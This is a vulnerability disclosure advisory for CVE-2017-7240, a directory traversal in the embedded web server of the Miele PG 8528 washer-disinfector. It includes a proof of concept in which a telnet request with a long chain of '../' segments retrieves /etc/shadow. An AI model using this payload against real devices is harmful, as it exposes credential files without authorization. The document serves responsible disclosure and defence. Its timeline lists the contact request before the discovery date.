Title:
======
Miele Professional PG 8528 - Web Server Directory Traversal

Author:
=======
Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG

CVE-ID:
=======
CVE-2017-7240

Risk Information:
=================
Risk Factor: Medium
CVSS Base Score: 5.0
CVSS Vector: CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N
CVSS Temporal Vector: CVSS2#E:POC/RL:OF/RC:C
CVSS Temporal Score: 3.9

Timeline:
=========
2016-11-16 Vulnerability discovered
2016-11-10 Asked for security contact
2016-11-21 Contact with Miele product representative
2016-12-03 Send details to the Miele product representative
2017-01-19 Asked for update, no response
2017-02-03 Asked for update, no response
2017-03-23 Public disclosure

Status:
=======
Published

Affected Products:
==================
Miele Professional PG 8528 (washer-disinfector) with ethernet interface.

Vendor Homepage:
================
https://www.miele.co.uk/professional/large-capacity-washer-disinfectors-560.htm?mat=10339600&name=PG_8528

Details:
========
The corresponding embeded webserver "PST10 WebServer" typically listens to port 80 and is prone to a directory traversal attack, therefore an unauthenticated attacker may be able to exploit this issue to access sensitive information to aide in subsequent attacks.

Proof of Concept:
=================
~$ telnet 192.168.0.1 80
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character ist '^]'.
GET /../../../../../../../../../../../../etc/shadow HTTP/1.1

HTTP/1.1 200 OK
Date: Wed, 16 Nov 2016 11:58:50 GMT
Server: PST10 WebServer
Content-Type: application/octet-stream
Last-Modified: Fri, 22 Feb 2013 10:04:40 GMT
Content-disposition: attachment; filename="./etc/shadow"
Accept-Ranges: bytes
Content-Length: 52

root:$1$$Md0i[...snip...]Z001:10933:0:99999:7:::

Fix:
====
We are not aware of an actual fix.